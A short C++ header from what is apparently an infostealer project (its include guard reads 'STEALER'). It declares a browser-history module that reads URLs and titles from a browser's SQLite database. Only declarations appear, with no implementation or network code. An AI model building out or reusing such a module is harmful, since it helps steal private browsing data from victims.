//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_CHISTORY_H
#define STEALER_CHISTORY_H


#include "../../BrowserModule.h"
#include "sqlite3.h"

struct History {
    std::string url = "Unknown";
    std::string title = "Unknown";
};

class CHistory : public BrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &path) override;
private:
    static std::list<History> getHistory(const fs::path &db_path);
};


#endif //STEALER_CHISTORY_H
